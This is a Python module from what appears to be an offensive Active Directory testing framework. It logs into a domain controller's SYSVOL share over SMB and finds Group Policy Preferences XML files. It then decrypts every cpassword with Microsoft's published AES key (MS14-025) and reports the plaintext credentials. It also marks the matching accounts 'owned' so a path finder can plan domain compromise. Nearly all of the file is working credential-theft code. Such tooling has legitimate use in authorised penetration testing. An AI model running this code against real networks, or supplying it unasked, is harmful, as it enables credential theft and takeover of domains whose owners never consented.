"""Group Policy Preferences (GPP) cpassword recovery — MS14-025.

Any authenticated domain user can read SYSVOL. For years, admins pushed local
accounts, mapped drives, services and scheduled tasks through Group Policy
Preferences, which stored the password as `cpassword` — AES-256 encrypted with a
key **Microsoft published in the MS-GPPREF spec**. So the ciphertext is
effectively plaintext to anyone in the domain.

This module crawls SYSVOL for the GPP XML files, decrypts every `cpassword` it
finds, and reports the recovered credentials. Reusable local-admin passwords
found this way are frequently a straight line to domain compromise, so recovered
principals are marked owned in the graph for the path finder.

Read-only collection + a public-key decrypt; nothing is written to the target.
"""

from __future__ import annotations

import base64
from typing import Optional
from xml.etree import ElementTree as ET

from adreaper.core.context import EngagementContext
from adreaper.core.graph import NodeType
from adreaper.core.logging import log
from adreaper.core.module import BaseModule, ModuleResult, Option, OptionType, Severity

# The AES-256 key Microsoft published in [MS-GPPREF] appendix A. Not a secret.
GPP_AES_KEY = bytes.fromhex(
    "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"
)

# GPP files that can carry a cpassword attribute.
GPP_FILES = {
    "groups.xml", "services.xml", "scheduledtasks.xml",
    "datasources.xml", "printers.xml", "drives.xml",
}

# attribute names that hold the associated account, most-specific first.
_USER_ATTRS = ["userName", "newName", "accountName", "runAs", "username", "name"]


class GppDecrypt(BaseModule):
    name = "credentials/gpp_decrypt"
    description = "Recover credentials from GPP cpassword in SYSVOL (MS14-025)."
    author = "Mealmeu"
    category = "credentials"
    requires = ["impacket"]
    references = [
        "https://attack.mitre.org/techniques/T1552/006/",
        "https://support.microsoft.com/help/2962486",
    ]
    options = [
        Option("target", "Host exposing SYSVOL (defaults to --dc-ip / target)",
               type=OptionType.STRING),
        Option("share", "Share to crawl", default="SYSVOL", type=OptionType.STRING),
    ]

    def run(self, ctx: EngagementContext) -> ModuleResult:
        res = self.result()
        target = self.opt("target") or ctx.primary_target()
        if not target:
            return res.fail("no target host (use --dc-ip or --target)").finish()

        from impacket.smbconnection import SMBConnection  # type: ignore

        cred = ctx.credential
        lm, nt = _hashes(cred)
        share = self.opt("share", "SYSVOL")
        try:
            smb = SMBConnection(target, target, timeout=ctx.timeout)
            smb.login(cred.username, cred.password, cred.domain, lm, nt)
        except Exception as e:
            return res.fail(f"SMB login to {target} failed: {e}").finish()

        xml_paths = _find_gpp_files(smb, share)
        log.info("scanning %d candidate GPP file(s) on %s\\%s", len(xml_paths), target, share)

        total = 0
        for path in xml_paths:
            try:
                data = _read_file(smb, share, path)
            except Exception as e:
                log.debug("read %s failed: %s", path, e)
                continue
            creds = extract_credentials(data)
            for c in creds:
                total += 1
                self._report(ctx, res, target, share, path, c)

        if total == 0:
            res.add_finding("No GPP cpassword credentials found", Severity.INFO,
                            description="SYSVOL contained no decryptable GPP passwords.")
        else:
            log.ok("recovered %d GPP credential(s)", total)
        res.data["credentials"] = total
        return res.finish()

    def _report(self, ctx, res, target, share, path, c) -> None:
        user = c["user"] or "(unknown)"
        res.add_finding(
            f"GPP credential recovered: {user}",
            Severity.HIGH,
            description="Password stored in Group Policy Preferences, decryptable by any "
                        "domain user with the Microsoft-published AES key.",
            evidence=f"{share}\\{path}  user={user}  password={c['plaintext']!r}"
                     + (f"  (action={c['source']})" if c.get("source") else ""),
            target=target,
            references=["https://attack.mitre.org/techniques/T1552/006/"],
        )
        # Mark a matching principal owned so the path finder starts from it.
        if c["user"]:
            hits = ctx.graph.find(c["user"].split("\\")[-1], NodeType.USER)
            for n in hits:
                ctx.graph.mark_owned(n.id)


# ---------------------------------------------------------------------------
# pure helpers (unit-tested)
# ---------------------------------------------------------------------------

def decrypt_cpassword(cpassword: str) -> str:
    """Decrypt a GPP cpassword blob to plaintext. Raises ValueError if it can't."""
    if not cpassword:
        return ""
    pad = len(cpassword) % 4
    if pad:
        cpassword += "=" * (4 - pad)
    try:
        blob = base64.b64decode(cpassword)
    except Exception as e:
        raise ValueError(f"bad base64: {e}") from e

    plain = _aes_cbc_decrypt(GPP_AES_KEY, b"\x00" * 16, blob)
    if plain:  # strip PKCS7 padding
        n = plain[-1]
        if 1 <= n <= 16 and plain[-n:] == bytes([n]) * n:
            plain = plain[:-n]
    return plain.decode("utf-16-le", errors="replace")


def _aes_cbc_decrypt(key: bytes, iv: bytes, data: bytes) -> bytes:
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes  # type: ignore
        dec = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
        return dec.update(data) + dec.finalize()
    except ImportError:
        from Crypto.Cipher import AES  # type: ignore
        return AES.new(key, AES.MODE_CBC, iv).decrypt(data)


def extract_credentials(xml_text: str) -> list[dict]:
    """Parse GPP XML text and return every recoverable credential.

    Returns a list of {user, cpassword, plaintext, changed, source} dicts, one
    per element bearing a non-empty cpassword attribute.
    """
    out: list[dict] = []
    text = xml_text.lstrip("﻿").strip()
    if not text:
        return out
    try:
        root = ET.fromstring(text)
    except ET.ParseError:
        return out

    for elem in root.iter():
        cpassword = elem.attrib.get("cpassword")
        if not cpassword:
            continue
        user = ""
        for key in _USER_ATTRS:
            if elem.attrib.get(key):
                user = elem.attrib[key]
                break
        try:
            plaintext = decrypt_cpassword(cpassword)
        except ValueError:
            plaintext = ""
        out.append({
            "user": user,
            "cpassword": cpassword,
            "plaintext": plaintext,
            "changed": elem.attrib.get("changed", ""),
            "source": _guess_source(root, elem),
        })
    return out


def _guess_source(root, elem) -> str:
    tag = root.tag.lower()
    known = {"groups": "local user/group", "ntservices": "service",
             "scheduledtasks": "scheduled task", "datasources": "data source",
             "drives": "mapped drive", "printers": "printer"}
    return known.get(tag, tag)


# -- SMB crawling (impacket, not unit-tested here) --------------------------

def _find_gpp_files(smb, share: str, root: str = "") -> list[str]:
    """Recursively list candidate GPP XML paths under `share` (relative paths)."""
    found: list[str] = []
    _walk(smb, share, root, found, depth=0)
    return found


def _walk(smb, share: str, path: str, found: list[str], depth: int) -> None:
    if depth > 12:
        return
    listing = f"{path}\\*" if path else "*"
    try:
        entries = smb.listPath(share, listing)
    except Exception:
        return
    for e in entries:
        name = e.get_longname()
        if name in (".", ".."):
            continue
        child = f"{path}\\{name}" if path else name
        if e.is_directory():
            _walk(smb, share, child, found, depth + 1)
        elif name.lower() in GPP_FILES:
            found.append(child)


def _read_file(smb, share: str, path: str) -> str:
    chunks: list[bytes] = []
    smb.getFile(share, path, chunks.append)
    return b"".join(chunks).decode("utf-8", errors="replace")


def _hashes(cred) -> tuple[str, str]:
    norm = cred.normalized_hash()
    if norm:
        lm, nt = norm.split(":", 1)
        return lm, nt
    return "", ""
